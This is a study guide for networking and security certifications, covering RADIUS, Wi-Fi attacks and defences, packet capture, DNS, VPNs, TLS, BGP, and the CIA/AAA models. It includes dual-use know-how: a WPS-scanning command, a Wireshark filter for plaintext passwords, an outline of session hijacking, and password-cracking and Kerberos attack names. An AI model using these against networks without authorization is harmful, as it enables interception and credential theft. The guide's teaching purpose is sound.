# FreeRADIUS quick test (after setup) radtest alice Password1 localhost 0 testing123 # Output: Access-Accept → credentials valid # Output: Access-Reject → bad credentials ── Key 802.1X flow ────────────────────────────────────────── Client (Supplicant) → AP (Authenticator) → RADIUS Server EAP-Request/Identity <────────────────────────────────────────────────────────── EAP-Response/Identity (alice@corp.com) ──────────────────────────────────────────────────────────> RADIUS Access-Request (forwarded) ──────────────────────────────> RADIUS Access-Accept / Reject <────────────────────────────── EAP-Success / Failure <────────────────────────────────────────────────────────── [4-way handshake to derive per-session keys]
Attacks
Common Wi-Fi Attacks & Defences
"Assume" makes an ass out of you and me — never assume the Wi-Fi network you're on is the real one. Rogue APs can be set up in minutes.
Attack Description Defence Evil Twin Fake AP with same SSID captures creds WPA3/EAP-TLS cert auth Deauth flood Force clients to reconnect (DOS) 802.11w Management Frame Protection PMKID attack Capture beacon, crack offline Long random WPA2 passphrase KRACK Key reinstallation in WPA2 handshake Patch all clients and APs WPS PIN bruteforce 8-digit PIN cracked in hours Disable WPS entirely # Check if a Linux NIC supports monitor mode iw list | grep -A5 "Supported interface modes" # Must show "monitor" mode for wireless analysis tools # Detect rogue APs on your network (passive scan) sudo iwlist wlan0 scanning | grep -E "(ESSID|Address|Encryption)" # Compare BSSID (MAC) list against your authorised AP inventory # Check if WPS is enabled (vulnerable) sudo wash -i wlan0 -C # part of reaver suite; scan for WPS-enabled APs
Hardening
Wi-Fi Network Design Best Practices
• Use WPA3 where supported; WPA2-Enterprise for corporate devices.
• Separate SSIDs (Service Set Identifier) for different trust levels: Corp, Guest, IoT (Internet of Things) — each on its own VLAN (Virtual Local Area Network).
• Guest SSID: internet-only; no access to internal resources.
• Disable SSID broadcast only adds minor friction — determined attackers still find hidden SSIDs. Don't rely on it for security.
• Enable 802.11w (Management Frame Protection) to block deauthentication attacks.
• Use a long, random passphrase (>20 chars) for WPA2-Personal — mix upper/lower/digit/symbol.
• Audit connected clients quarterly; disable MAC (Media Access Control) addresses that no longer belong to active employees/devices.
• You can't make someone make the right choice, yet you can pick up the pieces afterwards — when an employee connects a personal rogue AP, your WIDS (Wireless IDS) catches it; have a process to contain it quickly.
Beginner Packet Analysis – Reading the Network's Mind with Wireshark
Core Concept
Why Capture Packets?
Every problem on a network eventually shows up in the packets — slow apps, failed connections, intrusions, misconfigurations. A packet capture (pcap) is ground truth: it shows exactly what was sent and received, byte for byte.

Tools:
• tcpdump — command-line capture; runs anywhere, even on headless servers.
• Wireshark — GUI (Graphical User Interface) analysis; the gold standard for deep inspection.
• tshark — Wireshark's CLI (Command Line Interface) sibling; great for scripting and automation.

"Not my circus, not my monkey" — capturing traffic on a network you don't own or have authorization for is illegal in most jurisdictions (wiretapping laws). Always get written authorization.
Capture
Capturing Traffic with tcpdump
tcpdump uses Berkeley Packet Filter (BPF) syntax to select exactly the traffic you care about — capturing everything creates huge files and noise.
# Capture all traffic on eth0, write to a file (analyse later in Wireshark) sudo tcpdump -i eth0 -w capture.pcap # Capture only HTTP traffic (port 80) with full packet content sudo tcpdump -i eth0 -s 0 -w http.pcap port 80 # Capture traffic to/from a specific host sudo tcpdump -i eth0 host 192.168.1.50 # Capture traffic between two hosts on a specific port sudo tcpdump -i eth0 'host 192.168.1.50 and host 192.168.1.10 and port 443' # Show packets live, with readable ASCII (good for HTTP debugging) sudo tcpdump -i eth0 -A port 80 # Capture only SYN packets (new connection attempts — good for scan detection) sudo tcpdump -i eth0 'tcp[tcpflags] == tcp-syn' # Rotate captures every 100MB, keep last 10 files (long-running capture) sudo tcpdump -i eth0 -w /data/cap.pcap -C 100 -W 10
Analysis
Reading a Capture in Wireshark
Wireshark's display filter bar (top of the window) is the most powerful tool — it narrows thousands of packets down to the handful you care about.
─── Useful Wireshark display filters ───────────────────────── ip.addr == 192.168.1.50 # traffic to/from this host tcp.port == 443 # HTTPS traffic http.request.method == "POST" # only POST requests http contains "password" # find plaintext passwords (HTTP only!) tcp.flags.syn == 1 && tcp.flags.ack == 0 # new connections (SYN scan) tcp.analysis.retransmission # packets that had to be resent (perf issue) dns.qry.name contains "evil" # suspicious DNS lookups tls.handshake.extensions_server_name == "example.com" # TLS SNI filter ─── Right-click any packet → Follow → TCP Stream ───────────── # Reconstructs the entire conversation as readable text — # the single most useful feature for understanding "what happened" ─── Statistics menu ─────────────────────────────────────────── # Conversations: who talked to whom, how much data # Protocol Hierarchy: breakdown of traffic by protocol # IO Graph: visualise traffic volume over time (spot spikes)
tshark
Scripting Analysis with tshark
For repeatable analysis or processing huge captures, script it with tshark instead of clicking through the GUI.
# Extract all unique source/destination IP pairs tshark -r capture.pcap -T fields -e ip.src -e ip.dst | sort -u # Count HTTP requests by destination host tshark -r capture.pcap -Y "http.request" -T fields -e http.host | sort | uniq -c | sort -rn # Extract all DNS queries (great for spotting C2 domains) tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e frame.time -e ip.src -e dns.qry.name # Find the top talkers by byte volume tshark -r capture.pcap -q -z conv,ip | head -20 # Extract files transferred over HTTP (incident response) tshark -r capture.pcap --export-objects http,/tmp/extracted_files/
Beginner DNS (Domain Name System) Deep Dive – How Name Resolution Really Works
Mindset

Assume makes an ass out of you and me

When a website "won't load," don't assume it's the web server. DNS failures look identical to outages from the user's perspective. Walking the resolution chain step by step — instead of guessing — is what separates a five-minute fix from an hour of chasing the wrong problem.

Concept

The resolution chain, in order

When you type example.com into a browser, your computer doesn't magically know where to send the request. It walks a chain of lookups:

StepWhat happensWhere it's checked
1. Browser cache"Have I looked this up in the last few minutes?"Browser memory
2. OS cache"Does the operating system already know this?"systemd-resolved / dnsmasq / Windows DNS Client
3. Hosts file"Is there a manual override?"/etc/hosts or C:\Windows\System32\drivers\etc\hosts
4. Recursive resolver"Ask my configured DNS server (ISP, 1.1.1.1, 8.8.8.8) to find it"/etc/resolv.conf
5. Root → TLD → authoritativeThe resolver walks the DNS hierarchy until it finds the authoritative answerGlobal DNS infrastructure

Most "the website is down" tickets are solved at step 2 or 3 — a stale cache entry or a leftover hosts file edit from testing months ago.

Hands-on

Tracing resolution yourself

# See which resolver your system is configured to use
cat /etc/resolv.conf

# Look up a name and show the full trip — timing included
dig example.com

# Trace the entire chain from the root servers down (educational, slower)
dig +trace example.com

# Ask a *specific* DNS server directly, bypassing your default resolver
dig @1.1.1.1 example.com

# Check what record types exist — A (IPv4), AAAA (IPv6), MX (mail), TXT, CNAME
dig example.com MX
dig example.com TXT

# Reverse lookup: what name does this IP resolve back to?
dig -x 93.184.216.34

The +trace flag is especially good for learning — it shows the actual hierarchy: your resolver asks a root server "who handles .com?", then asks that TLD server "who handles example.com?", then finally asks the authoritative server for the actual IP (Internet Protocol).

Common pitfall

"It works on my machine" — DNS cache edition

A classic scenario: a developer changes a DNS record, tells you "it's updated," and your browser still shows the old site. Both of you are right — the record changed at the authoritative server, but your resolver cached the old answer for its full TTL (time-to-live). Common fixes, in order of how invasive they are:

# Flush just your local OS resolver cache (Linux with systemd-resolved)
sudo resolvectl flush-caches

# macOS
sudo dscacheutil -flushcache; sudo killall -HUP mDNSResponder

# Windows (run as administrator)
ipconfig /flushdns

# Or simply query a different resolver to sanity-check the *real* current value
dig @8.8.8.8 example.com +short

If a record was just changed, remember that TTL still applies globally — other people's resolvers around the world will keep serving the cached answer until their TTL expires too. This is why planned DNS cutovers lower the TTL days in advance.

Beginner VPNs (Virtual Private Network) Explained – Tunnels, Encryption, and What They Don't Do
Concept

A VPN is a private tunnel through a public road

Imagine the internet as a public highway system — anyone running the right equipment at the right point could, in theory, see which trucks are going where. A VPN (Virtual Private Network) builds an encrypted tunnel through that highway: your traffic still travels over the same public infrastructure, but it's wrapped in a layer that hides its contents from anyone watching the road, and makes it appear to originate from the tunnel's far end rather than your actual location.

Concept

Two very different reasons people use VPNs

Use caseWhat it actually doesCommon protocols
Corporate / remote-access VPNLets an employee's laptop join the company's internal network from anywhere, as if it were plugged in at the officeWireGuard, OpenVPN, IPsec/IKEv2, Cisco AnyConnect
Consumer / privacy VPNRoutes your traffic through a third-party provider's server so your ISP (Internet Service Provider) and local network can't see *what* you're accessing — though the VPN provider now canWireGuard, OpenVPN (commercial offerings)

These solve different problems for different threat models. A corporate VPN exists so IT can extend a trusted network boundary to remote workers; a consumer VPN exists to shift *who* has visibility into your traffic — from your ISP to the VPN provider — which is a meaningfully different guarantee than "no one can see what I do online."

Hands-on

Setting up a minimal WireGuard tunnel (lab environment)

# Install WireGuard (Debian/Ubuntu)
sudo apt install wireguard

# Generate a public/private keypair for this peer
wg genkey | tee privatekey | wg pubkey > publickey

# Minimal config: /etc/wireguard/wg0.conf
# (replace placeholders with real keys and addresses)
#
# [Interface]
# PrivateKey = <this peer's private key>
# Address = 10.10.0.2/24
#
# [Peer]
# PublicKey = <remote peer's public key>
# Endpoint = vpn.example.com:51820
# AllowedIPs = 0.0.0.0/0
# PersistentKeepalive = 25

# Bring the tunnel up and check its status
sudo wg-quick up wg0
sudo wg show

# Confirm your traffic is actually routing through the tunnel
curl https://ifconfig.me

The AllowedIPs = 0.0.0.0/0 line is the one to read carefully — it tells the system to route all traffic through the tunnel ("full tunnel"), versus a narrower range that only sends specific destinations through it ("split tunnel"). Getting this wrong is one of the most common VPN misconfigurations: too broad and you may break local network access; too narrow and traffic you meant to protect goes out in the clear.

Common pitfall

"I'm on a VPN, so I'm anonymous" — assume makes an ass out of you and me

A VPN hides your traffic's path and contents from your local network and ISP — it does not make you anonymous to the websites you visit. You can still be tracked through cookies, browser fingerprinting, account logins, and the VPN provider itself can see (and in some jurisdictions, may be compelled to log and disclose) your activity. Treat "I'm using a VPN" as one layer of a privacy strategy, not a magic cloak — and always read a provider's actual logging policy rather than assuming "no logs" means what it sounds like.

Beginner Subnetting Without the Headache – CIDR (Classless Inter-Domain Routing) Notation Made Practical
Concept

A subnet is just "how big is this neighborhood?"

An IP (Internet Protocol) address tells you a device's location; a subnet mask tells you how many of its neighbors share the same local "neighborhood" — the group of addresses that can talk to each other directly, without going through a router. CIDR notation (/24, /26, etc.) is just a compact way of writing that mask: the number after the slash tells you how many bits are reserved for identifying the network itself, leaving the rest for individual hosts.

Concept

The CIDR cheat sheet beginners actually reach for

CIDRSubnet maskUsable hostsCommon use
/24255.255.255.0254Typical small office or home network
/25255.255.255.128126Splitting a /24 in half — two departments, one building
/26255.255.255.19262A single floor or smaller team
/27255.255.255.22430A small lab, a rack of servers, a point-to-point link group
/30255.255.255.2522A direct link between two routers — exactly enough for both ends

Notice the pattern: every step from /24 toward /32 cuts the available addresses roughly in half. "Usable hosts" is two less than the raw count — one address is reserved to identify the network itself, and one is reserved as the broadcast address that reaches every device in that subnet at once.

Hands-on

Let the tools do the arithmetic — verify, don't memorize

# pip install — actually it's built into Python's standard library!
import ipaddress

network = ipaddress.ip_network("192.168.10.0/26")
print(f"Network address:   {network.network_address}")
print(f"Broadcast address: {network.broadcast_address}")
print(f"Usable hosts:      {network.num_addresses - 2}")
print(f"First usable host: {list(network.hosts())[0]}")
print(f"Last usable host:  {list(network.hosts())[-1]}")

# Quick check: is this address inside that subnet?
ip = ipaddress.ip_address("192.168.10.40")
print(f"{ip} in {network}? {ip in network}")

# Splitting a network into smaller subnets — handy for planning
# departmental allocations from a single block you've been given
for sub in network.subnets(new_prefix=28):
    print(f"  Sub-block: {sub}")

This is the honest secret of subnetting: nobody who works with networks daily does the binary math by hand every time. They've internalized the cheat-sheet patterns for common cases, and they reach for a calculator (or ipaddress, or ipcalc on the command line) to double-check anything unusual. Knowing how it works conceptually — and knowing how to verify it — beats memorizing tables you'll forget under pressure.

Mindset

Assume makes an ass out of you and me

"That device should be able to reach the server, they're both on the 192.168.x.x range" is a classic trap — two addresses can look similar and still be in completely different subnets, unable to communicate without a router between them. Before troubleshooting further up the stack, verify the actual subnet boundaries with a tool like the one above rather than eyeballing the addresses and assuming they're neighbors.

Beginner Load Balancers Explained – Spreading the Work Around
Concept

A load balancer is a traffic cop for your servers

A load balancer sits in front of a group of servers and decides which one should handle each incoming request — spreading the work around so no single server gets overwhelmed, and so the service keeps running even if one server fails. From the outside, users see a single address; behind that address, the load balancer quietly routes them to whichever healthy server makes the most sense at that moment.

Concept

Common balancing strategies, and when each shines

StrategyHow it decidesGood fit when...
Round robinCycles through servers in order: 1, 2, 3, 1, 2, 3...All servers are roughly equal in capacity and requests are roughly equal in cost
Least connectionsSends the next request to whichever server currently has the fewest active connectionsRequests vary significantly in how long they take to process
IP (Internet Protocol) hashRoutes based on a hash of the client's IP — the same client tends to land on the same serverYou need "session stickiness" without a shared session store
WeightedSome servers get proportionally more traffic than others, based on assigned weightsYour servers have meaningfully different capacities (a newer, beefier box vs. an older one)
Concept

The unsung hero: health checks

A load balancer is only as good as its ability to know which servers are actually healthy. It periodically polls each server — often hitting a dedicated /healthz endpoint — and silently stops sending traffic to any server that fails to respond correctly. This is the mechanism that turns "one server crashed" from a customer-facing outage into a non-event nobody outside the on-call team ever notices.

# A minimal health endpoint, the kind a load balancer polls every few seconds
from flask import Flask, jsonify
app = Flask(__name__)

@app.route("/healthz")
def health_check():
    checks = {
        "database": database_is_reachable(),
        "cache": cache_is_reachable(),
        "disk_space_ok": get_free_disk_percent() > 10,
    }
    healthy = all(checks.values())
    status_code = 200 if healthy else 503
    return jsonify(checks), status_code

# A load balancer that sees repeated 503s here will quietly stop
# routing traffic to this instance — without a single human noticing,
# until someone reviews the dashboards and finds the graceful save
Mindset

Assume makes an ass out of you and me

A health check that only verifies "is the web server process running?" can report "healthy" while the actual database connection behind it is completely down — leaving users staring at error pages from a server the load balancer confidently considers fine. A good health check verifies the things that actually matter to the user's experience, not just the easiest thing to check. "The process is running" and "the service actually works" are two different claims — don't let your monitoring assume they're the same.

Beginner The TLS (Transport Layer Security) Handshake – What Actually Happens Before "https://" Feels Safe
Concept

The padlock icon represents a surprisingly elegant negotiation

Every time you load an HTTPS (HyperText Transfer Protocol Secure) site, your browser and the server perform a rapid multi-step negotiation called the TLS handshake — establishing trust and agreeing on encryption, all before a single byte of your actual page content is transmitted. It happens in well under a second, which is part of why it's so easy to never think about. Understanding the broad strokes demystifies a huge portion of "how the secure web works."

Concept

The handshake in (roughly) five steps

StepWhat happens
1. Client HelloYour browser says hello and lists the encryption methods ("cipher suites") it supports, plus a random number used later in key generation.
2. Server Hello + CertificateThe server picks a cipher suite both sides support and sends back its digital certificate — proof of identity issued by a trusted Certificate Authority (CA).
3. Certificate verificationYour browser checks that the certificate is valid, unexpired, matches the domain you're visiting, and was signed by a CA it trusts. This is the step that turns a green padlock into something meaningful rather than decorative.
4. Key exchangeBoth sides use cryptographic math (often Diffie-Hellman) to agree on a shared session key — without ever transmitting that key in a form an eavesdropper could use.
5. Secure session beginsFrom here on, all traffic is encrypted with the session key using fast symmetric encryption — the certificate-based "slow" cryptography has done its job and steps aside.
Concept

Inspecting a real certificate from the command line

You don't need special tools to see this in action — openssl can show you exactly what your browser is silently checking on every visit:

# Connect and dump the certificate chain for a domain:
openssl s_client -connect example.com:443 -servername example.com </dev/null 2>/dev/null | openssl x509 -noout -text

# Useful fields to look for in the output:
#   Issuer:        which Certificate Authority vouched for this site
#   Subject:       the domain(s) the certificate is valid for
#   Validity:      the "Not Before" / "Not After" window -- expired
#                  certificates are a surprisingly common outage cause
#   Signature Algorithm:  the cryptographic method used to sign it
Concept

Why "the padlock is green" isn't the same as "this site is trustworthy"

This is a critical distinction that "assume makes an ass out of you and me" captures perfectly. TLS guarantees two specific things: that your connection to the server is encrypted in transit, and that the certificate matches the domain you typed. It guarantees nothing whatsoever about whether the organization running that domain is honest, competent, or safe to hand your data to. Attackers can — and routinely do — obtain valid certificates for convincingly-misspelled lookalike domains. The padlock confirms "this connection isn't being eavesdropped on right now." It does not confirm "you should trust what's on the other end of it." Those are two different questions, and conflating them is one of the most common (and most exploited) assumptions on the web.

🗺️ BGP (Border Gateway Protocol) — How the Internet Routes Between Networks Routing ▶
Concept
The Protocol That Glues the Internet Together
Protocols like OSPF (Open Shortest Path First) route inside one organization. But the internet is ~75,000 independent networks (ISPs, clouds, universities) that must agree on how to reach each other. BGP — the Border Gateway Protocol — is how they do it. Each network is an Autonomous System (AS) with a number, and BGP is how ASes advertise which IP ranges they can reach and learn routes to everywhere else. It's the internet's routing table, assembled by agreement rather than central control.
Reference
Key Terms
TermMeaning
Autonomous System (AS)A network under one administrative control, identified by an ASN (Autonomous System Number) (e.g. AS15169 = Google).
PrefixAn advertised IP range, e.g. 8.8.8.0/24.
PeeringTwo ASes agree to exchange traffic directly (often settlement-free).
TransitPaying a larger ISP (Internet Service Provider) to reach the rest of the internet.
AS_PATHThe list of ASes a route passes through — used to pick paths and prevent loops.
eBGP / iBGPBGP between different ASes / within one AS.
How It Chooses
Path Selection & Why It's Different
BGP is a path-vector protocol: it doesn't pick the route with the least latency or fewest hops the way an interior protocol might — it picks based on policy. Operators tune attributes to prefer cheaper or contractually-preferred paths.
Attribute (in order)Effect
Local PreferenceHighest wins — an AS's own preference for outbound paths.
AS_PATH lengthShorter path preferred (fewer ASes to cross).
MEDA hint to a neighbor about which entry point to prefer.
Fragility
When BGP Goes Wrong
BGP largely runs on trust, which is also its weakness. A route hijack — an AS advertising prefixes it doesn't own — can silently reroute or black-hole traffic (it has taken down large chunks of the internet, sometimes by accident via a route leak, a misconfigured advertisement). Defenses: RPKI (Resource Public Key Infrastructure) (cryptographically validates who may originate a prefix) and prefix filtering between peers. This fragility is why a single fat-fingered BGP change at a big provider can make headlines.
🚦 QoS — Quality of Service & Traffic Shaping Networking ▶
Concept
Not All Packets Are Equal
When a link gets congested, something has to give. Without Quality of Service, the network drops packets indiscriminately — and a big file download can wreck a video call sharing the same pipe. QoS lets you classify traffic and give the time-sensitive kinds (voice, video, gaming) priority over the ones that don't care about a little delay (backups, email, updates). It manages a scarce resource — bandwidth — by policy instead of first-come-first-served.
Reference
The Four Things QoS Manages
MetricWhat It IsHurts…
BandwidthThroughput availableLarge transfers
LatencyDelay end to endVoice, gaming, trading
JitterVariation in latencyReal-time audio/video (choppy calls)
LossPackets droppedEverything; voice can't retransmit
Voice/video care most about jitter and loss; bulk data cares only about eventual bandwidth. QoS trades one for the other on purpose.
How It Works
Classify → Mark → Queue → Shape
StepWhat Happens
ClassificationIdentify traffic by port, app, or existing marking.
MarkingStamp a priority in the packet header — DSCP (Differentiated Services Code Point) (6 bits in the IP header) is the standard. EF = Expedited Forwarding for voice.
QueuingHigh-priority marks go into faster queues; routers service them first.
Shaping vs PolicingShaping buffers excess traffic to smooth it; policing just drops it over a limit.
Practical
Where You Meet QoS
QoS only helps on links you control — your router, your WAN (Wide Area Network), an enterprise LAN (Local Area Network) — because markings are honored within an administrative domain and often reset at the public internet boundary (the internet is best-effort; your DSCP tags mean nothing to your ISP unless you buy an SLA). Classic uses: prioritizing VoIP (Voice over Internet Protocol) on an office network, keeping a video call smooth on a home router, and guaranteeing latency-sensitive traffic across an MPLS (Multiprotocol Label Switching) or SD-WAN (Software Defined Wide Area Network) link.
🚀 HTTP/2 (HyperText Transfer Protocol version 2), HTTP/3 (HyperText Transfer Protocol version 3) & QUIC (Quick UDP Internet Connections) — Modern Web Transport Networking ▶
Concept
Making the Web Fast, One Protocol at a Time
HTTP/1.1 (1997) sends one request at a time per connection and in plain text — browsers opened 6+ connections per site just to keep up. HTTP/2 and HTTP/3 keep the same familiar HTTP (HyperText Transfer Protocol) semantics (methods, headers, status codes) but completely rework how bytes move on the wire to kill latency. Same API (Application Programming Interface), radically faster transport.
Reference
Three Generations
HTTP/1.1HTTP/2HTTP/3
TransportTCP (Transmission Control Protocol)TCPQUIC (over UDP)
FormatTextBinaryBinary
MultiplexingNo (1 at a time)Yes (many streams)Yes
Header compressionNoneHPACKQPACK
Head-of-line blockPer requestAt TCP layerSolved
Key Ideas
Multiplexing & Head-of-Line Blocking
HTTP/2's big win is multiplexing: many requests share one connection as independent "streams," so a slow response doesn't block the others at the HTTP layer. But they still ride one TCP connection — and if a single TCP packet is lost, TCP stalls all streams until it's retransmitted. That's head-of-line blocking at the transport layer, HTTP/2's remaining weakness.
The Leap
Why HTTP/3 Ditched TCP for QUIC
QUIC featureBenefit
Runs on UDP (User Datagram Protocol)Streams are independent — one lost packet only stalls its own stream, not all of them.
TLS (Transport Layer Security) 1.3 built inEncryption isn't optional; the handshake is baked into the transport.
Faster handshakes0-RTT / 1-RTT connection setup vs TCP+TLS's multiple round trips.
Connection migrationA connection ID (not IP:port) means switching Wi-Fi → cellular doesn't drop the connection.
Because QUIC lives in user space (not the OS kernel like TCP), it evolves faster. The trade-off: some middleboxes/firewalls throttle or block UDP, so clients fall back to HTTP/2 over TCP when needed.
🕰️ NTP (Network Time Protocol) & Time Synchronization — Why Clocks Matter Networking ▶
Concept
A Few Seconds of Drift Breaks Surprising Things
Every computer has a cheap quartz clock that drifts — seconds per day. On one laptop that's harmless; across a fleet it's a disaster. The Network Time Protocol keeps machines synchronized to within milliseconds of a reference time by measuring the round-trip delay to time servers and correcting for it. It's invisible infrastructure — until a clock is wrong and logins fail, logs won't correlate, and TLS (Transport Layer Security) certificates appear "not yet valid."
Why It Matters
What Breaks When Clocks Disagree
SystemFailure With Bad Time
TLS / certificatesCerts have valid-from/valid-to windows; a skewed clock rejects good certs (or trusts expired ones).
Kerberos / AD (Active Directory) authTickets are time-stamped; default tolerance is ~5 minutes — beyond that, logins fail.
MFA (Multi-Factor Authentication) / TOTP codesTime-based one-time codes rotate every 30s; a wrong clock rejects valid codes.
Log correlationInvestigating an incident across servers is impossible if their timestamps don't line up.
Databases / distributed systemsOrdering, leases, and conflict resolution can misbehave with clock skew.
Reference
Stratum — The Hierarchy of Trust
StratumSource
0Reference clock — atomic clock, GPS (Global Positioning System). Not on the network itself.
1Servers directly attached to a stratum-0 source.
2, 3, …Sync from the stratum above; the number grows with distance from the source.
Most machines sync from public pools (pool.ntp.org) or an internal server. Best practice: point your fleet at a couple of internal NTP servers that themselves sync upstream — consistent time, less external dependence.
Commands
Checking Time Sync (Linux)
timedatectl                    # is NTP active & synchronized?
timedatectl show-timesync      # current server & poll interval
chronyc tracking              # chrony: offset, drift, stratum
chronyc sources -v            # which servers, how reachable
ntpq -p                       # classic ntpd: peer list & offsets
Modern Linux uses chrony or systemd-timesyncd; both slew the clock gradually rather than jumping it, so time never runs backward. Always store and compare time in UTC — convert to local only for display.
🚪 Reverse Proxies — nginx, HAProxy & the Front Door Networking ▶
Concept
One Front Door for Many Back-End Services
A reverse proxy sits in front of your servers and receives every client request first, then forwards it to the right back-end. (A forward proxy sits in front of clients; a reverse proxy fronts servers — hence the name.) It's the single front door where you centralize TLS (Transport Layer Security), routing, caching, and protection — so your application servers can stay simple and private.
Reference
What a Reverse Proxy Does For You
JobWhat It Means
TLS terminationHandles HTTPS/certs at the edge; talks plain HTTP (HyperText Transfer Protocol) to back-ends, so they don't each manage certs.
Load balancingSpreads requests across multiple back-end instances.
RoutingSends /api to one service and / to another by path or hostname.
Caching & compressionServes cached/gzipped responses without hitting the app.
ProtectionRate limiting, request filtering, hiding back-end topology.
Static filesServes assets directly, freeing the app for dynamic work.
Example
A Minimal nginx Reverse Proxy
server {
    listen 443 ssl;
    server_name app.example.com;

    ssl_certificate     /etc/ssl/app.crt;   # TLS ends here
    ssl_certificate_key /etc/ssl/app.key;

    location /api/ {
        proxy_pass http://127.0.0.1:3000;  # forward to the app
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;  # keep client IP
    }

    location / {
        root /var/www/site;             # serve static files
    }
}
Reference
The Common Tools
ToolStrength
nginxWeb server + reverse proxy + static + cache. The default workhorse.
HAProxyPurpose-built, high-performance TCP/HTTP load balancer with deep health-check & metrics support.
CaddyAutomatic HTTPS (HyperText Transfer Protocol Secure) (Let's Encrypt out of the box); simplest config.
Envoy / TraefikCloud-native, dynamic config; common as Kubernetes ingress and service-mesh proxies.
The X-Forwarded-For / X-Real-IP headers matter: once a proxy is in the path, the back-end sees the proxy's IP (Internet Protocol) unless the proxy passes the real client IP along in these headers.
🤖 Network Automation — Ansible, Netmiko & NAPALM Automation ▶
Reference
Stop Configuring Switches by Hand
Managing hundreds of devices via CLI (Command Line Interface) is slow and error-prone. Network automation treats configuration as code — versioned, tested, and pushed programmatically. This is the heart of NetDevOps.
ToolRole
Ansible (network modules)Declarative, agentless config push across vendors
NetmikoPython SSH (Secure Shell) library for sending CLI commands
NAPALMVendor-neutral API (Application Programming Interface) — get/replace config uniformly
gNMI / NETCONF / RESTCONFModel-driven (YANG) APIs — the modern replacement for CLI scraping
Source of truth: keep intended config in Git (often generated from a data model with Jinja2 templates), then push and verify. Model-driven telemetry (gNMI streaming) is replacing SNMP (Simple Network Management Protocol) polling for monitoring.
🔐 DNSSEC (Domain Name System Security Extensions) & Encrypted DNS (Domain Name System) — DoH (DNS over HTTPS) / DoT (DNS over TLS) DNS Security ▶
Concept
Two Different Problems With DNS
Plain DNS is both unauthenticated (answers can be forged) and unencrypted (anyone on-path can read/modify queries). Two separate technologies fix these — and they're often confused.
TechSolves
DNSSECIntegrity/authenticity — signs records so forgery (cache poisoning) is detectable. Not encryption.
DoT (DNS over TLS)Privacy — encrypts DNS on port 853
DoH (DNS over HTTPS)Privacy — encrypts DNS inside HTTPS (HyperText Transfer Protocol Secure) (443), blends with web traffic
Key distinction: DNSSEC proves an answer is genuine but is public; DoH/DoT keep the query private but don't prove authenticity. You want both. DoH complicates enterprise DNS filtering — a real blue-team consideration.
🌐 WAN (Wide Area Network) & Switching Deep — SD-WAN (Software Defined Wide Area Network), MPLS (Multiprotocol Label Switching), VLANs (Virtual Local Area Network) & PoE (Power over Ethernet) Infrastructure ▶
Reference
Connecting Sites and Carving Up Switches
A grab-bag of infrastructure concepts that show up constantly in enterprise networking and on the Network+/CCNA exams.
ConceptDetail
MPLSCarrier "label-switched" WAN — fast, reliable, expensive private transport
SD-WANSoftware overlay across cheap internet links; policy-based path selection (displacing MPLS)
802.1Q trunkingTag frames so one link carries many VLANs between switches
MulticastOne-to-many delivery (IGMP) — video/streaming without flooding
PoEPower over Ethernet — run APs, phones & cameras on the data cable
The trend: SD-WAN + SASE (Secure Access Service Edge) (security + networking as a cloud service) is where enterprise WAN is heading — central policy, encrypted overlays, and security inspection built into the fabric.

Sec+ SecX
CIA Triad · AAA · Access Control · PKI · Crypto · Cloud · Zero Trust · Kerberos 49 topics · ~1h 55m ▾
🔐 CIA (Confidentiality, Integrity, Availability) Triad CORE MODEL ▶
Foundational Model
Confidentiality · Integrity · Availability
Every security control maps to one or more CIA pillars. The attacker's mirror is the DAD Triad: Disclosure · Alteration · Destruction/Denial.
🔒
Confidentiality
Data accessible only to authorized parties. Controls: encryption, MFA (Multi-Factor Authentication), access controls, data classification
✅
Integrity
Data is accurate & unaltered. Controls: hashing, digital signatures, checksums, version control, audit logs
⚡
Availability
Systems accessible when needed. Controls: redundancy, backups, DDoS (Distributed Denial of Service) mitigation, uptime SLAs (Service Level Agreement), failover
🎫 AAA (Authentication, Authorization, and Accounting) Framework SECURITY MODEL ▶
Framework
Authentication · Authorization · Accounting
Implemented via RADIUS (Remote Authentication Dial-In User Service) (UDP 1812/1813), TACACS+ (Terminal Access Controller Access-Control System Plus) (TCP 49), and IAM (Identity and Access Management) platforms. RADIUS encrypts only the password; TACACS+ encrypts the full payload.
A
Authentication
WHO are you? Password, MFA (Multi-Factor Authentication), certs, biometrics, smart cards, FIDO2 (Fast Identity Online 2)
A
Authorization
WHAT can you access? ACLs (Access Control List), RBAC (Role-Based Access Control), ABAC (Attribute-Based Access Control), policies applied after auth
A
Accounting
WHAT did you do? Logs, session records, audit trails, SIEM (Security Information and Event Management) feeds, billing

🔓 Password & Authentication Attack Types ATTACK TAXONOMY ▶
Framework — Source: CEH (Certified Ethical Hacker) Cheat Sheet
Online · Offline · Non-Electronic · Sidejacking
Password attacks are categorized by whether an attacker interacts with a live system. CompTIA (Computing Technology Industry Association) password policy: Minimum 3 of 4 complexity components — Special, Number, Uppercase, Lowercase.
Attack Type Method Example Tools
Passive Online Sniff wire, intercept cleartext passwords, replay attacks, MITM (Man-in-the-Middle) Wireshark, Ettercap, Responder
Active Online Direct password guessing against live system; credential stuffing Hydra, Medusa, Burp Suite
Offline Steal copy of hash file (e.g., SAM), crack on separate system Hashcat, John the Ripper, Rainbow Crack
Non-Electronic Social engineering, shoulder surfing, dumpster diving —
▸ HASH CRACKING METHODS
Method Description Defense
Brute-Force Try every character combination systematically Long passwords, account lockout
Dictionary Try wordlist of probable passwords Avoid common words; enforce complexity
Rainbow Tables Pre-computed hash-to-password lookup tables Salt hashes (bcrypt/Argon2)
Credential Stuffing Reuse breached username:password pairs Unique passwords, MFA (Multi-Factor Authentication)
Password Spray Try one common password across many accounts Lockout policies, MFA
Pass-the-Hash (PtH) Use stolen NTLM (NT LAN Manager) hash without cracking it Credential Guard, least privilege
▸ SIDEJACKING / SESSION HIJACKING
1 — Sniff Traffic
Capture packets between client and server (requires same network or MITM position)
2 — Monitor & Predict
Monitor traffic flow; predict sequence numbers or steal session tokens/cookies
3 — Desynchronise
Knock legitimate client out of session by sending RST or forged packets
4 — Take Over Session
Inject packets with stolen session token/cookie to the target server
🎟️ Kerberos Authentication Flow 4-STEP PROTOCOL ▶
Protocol — Source: CEH (Certified Ethical Hacker) + CISSP (Certified Information Systems Security Professional) Cheat Sheets
Kerberos — Ticket-Based Authentication (port 88)
Kerberos uses symmetric + asymmetric encryption. Default in Active Directory environments. Attacks: Kerberoasting (offline crack service ticket), Pass-the-Ticket (reuse TGT/TGS), Golden Ticket (forged TGT using KRBTGT hash).
KDC (Key Distribution Center)
Key Distribution Centre — central trust authority (runs AS + TGS)
AS
